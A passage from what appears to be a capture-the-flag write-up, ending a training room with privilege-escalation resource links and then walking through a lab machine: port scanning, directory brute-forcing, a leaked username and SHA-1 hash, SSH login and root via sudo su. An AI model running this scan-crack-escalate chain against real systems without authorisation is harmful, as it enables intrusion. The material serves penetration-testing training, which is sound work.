- In the interactive prompt, how would you upload your /etc/hosts file
> put /etc/hosts

## [Miscellaneous]: A note on privilege escalation
privilege escalation is such a large topic that it would be impossible to do it proper justice in this type of room. However, it is a necessary topic that must be covered, so rather than making a task with questions, I shall provide you all with some resources.

General:
- [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) (A bunch of tools and payloads for every stage of pentesting)

Linux:
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) (a bit old but still worth looking at)
- [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) (One of the most popular priv esc scripts)
- [https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh) (Another popular script)
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) (A Script that's dedicated to searching for kernel exploits)
- [https://gtfobins.github.io](https://gtfobins.github.io) (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)

Windows:
- [https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)  (Dictates some very useful commands and methods to enumerate the host and gain intel)
- [https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) (A bit old but still an incredibly useful script)
- [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS) (A general enumeration script)

## [Section 7 - Final Exam]: Good Luck :D

#### Scanning
Scanning all ports.

```bash
$ rustscan -a 10.10.204.89 --ulimit 10000 -- -A -v -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.204.89:22
Open 10.10.204.89:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-20 10:27 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:27
Completed Parallel DNS resolution of 1 host. at 10:27, 13.01s elapsed
DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 10:27
Scanning 10.10.204.89 [2 ports]
Discovered open port 80/tcp on 10.10.204.89
Discovered open port 22/tcp on 10.10.204.89
Completed Connect Scan at 10:27, 0.19s elapsed (2 total ports)
Initiating Service scan at 10:27
Scanning 2 services on 10.10.204.89
Completed Service scan at 10:27, 6.40s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.204.89.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:27
Completed NSE at 10:28, 5.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:28
Completed NSE at 10:28, 0.75s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:28
Completed NSE at 10:28, 0.00s elapsed
Nmap scan report for 10.10.204.89
Host is up, received user-set (0.19s latency).
Scanned at 2021-01-20 10:27:51 EST for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfc3f0BTiHCcXfM5HblbdICzdy1guzmd9N9m12TmOIFFFHdeHQbWjCnA38bbRtlJbvKUXcvQBqtV7UCeHLbcLGq27LeoxnNW6XeVlmXLqwu/hqJqVyi9PDp1U21NwtJz/MaF0nXhirp1MKcj94QZjRHMuvrywpw0jlJAD34OUufv6HT5a5eakO/QrSNTLgACV0AIn3Pb5/iC6bSOctj7+e5ndq5IcHuHaVtpjVV9gCF62xxTCN6hdQKF8KjWfWUEkEDRhgjKyENsLO1/XUNH0iTHsvOH8N3JN9z43067NBlX3sddciBl2HNwxlQEe8O8UC63yHvmx4M7agoyDYPwTF
|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH3QGzm8W9HuRYyoZkwHKkcVgJDlqnCU0s6Rt5fPp/Z34BYj4845B5la/2abdCyJ4zPUuOyS2OMAyJAFUm31kG0=
|   256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILs98AjzXfqGGqDneopePHJoBvde46uWWPJ4r7xfVv5p
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH and HTTP only.

#### Enumeration
Let's run `gobuster` to check hidden files or directories.

```bash
$ gobuster dir -u http://10.10.204.89/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,jpg,html,css,jpeg,txt,conf,ini,xxa,bak
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.204.89/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg,css,conf,xxa,php,html,jpeg,txt,ini,bak
[+] Timeout:        10s
===============================================================
2021/01/20 10:31:56 Starting gobuster
===============================================================
/index.html (Status: 200)
[ERROR] 2021/01/20 10:33:16 [!] Get http://10.10.204.89/departments: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/secret (Status: 301)
Progress: 6208 / 220561 (2.81%)
```

Let's enumerate `/secret` directory.

```bash
$ gobuster dir -u http://10.10.204.89/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,jpg,html,css,jpeg,txt,conf,ini,xxa,bak
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.204.89/secret
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     bak,php,html,jpeg,txt,conf,ini,xxa,jpg,css
[+] Timeout:        10s
===============================================================
2021/01/20 10:36:41 Starting gobuster
===============================================================
/index.html (Status: 200)
[ERROR] 2021/01/20 10:38:31 [!] Get http://10.10.204.89/secret/children.bak: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/20 10:39:23 [!] Get http://10.10.204.89/secret/Development.bak: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/20 10:39:30 [!] Get http://10.10.204.89/secret/364.jpg: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/20 10:40:37 [!] Get http://10.10.204.89/secret/020.jpeg: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/secret.txt (Status: 200)
```

Let's check `/secre.txt`. We got a username and hashed password!

```
nyan:046385855FC9580393853D8E81F240B66FE9A7B8
```

Let's crack the hash. It's `nyan` with hash SHA-1. 

#### Gaining Access
Since we have the username and password, let's `ssh` to the machine.

```bash
$ ssh nyan@10.10.204.89                      
The authenticity of host '10.10.204.89 (10.10.204.89)' can't be established.
ECDSA key fingerprint is SHA256:haqegvkQqmIEEzS0Mcd+NUsONboBQ6z3wQSwq+aj5Es.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.204.89' (ECDSA) to the list of known hosts.
nyan@10.10.204.89's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Dec 21 08:37:54 2019
nyan@ubuntu:~$
```

user.txt:

```bash
nyan@ubuntu:~$ ls
user.txt
nyan@ubuntu:~$ cat user.txt
REDACTED
```

#### Escalation
Let's check sudo privileges.

```bash
nyan@ubuntu:~$ sudo -l
Matching Defaults entries for nyan on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
```

We can run `su` as root. Let's `su` to root.

```bash
nyan@ubuntu:~$ sudo su
root@ubuntu:/home/nyan#
```

root.txt

```bash
root@ubuntu:/home/nyan# cat /root/root.txt
congratulations!!!!
```
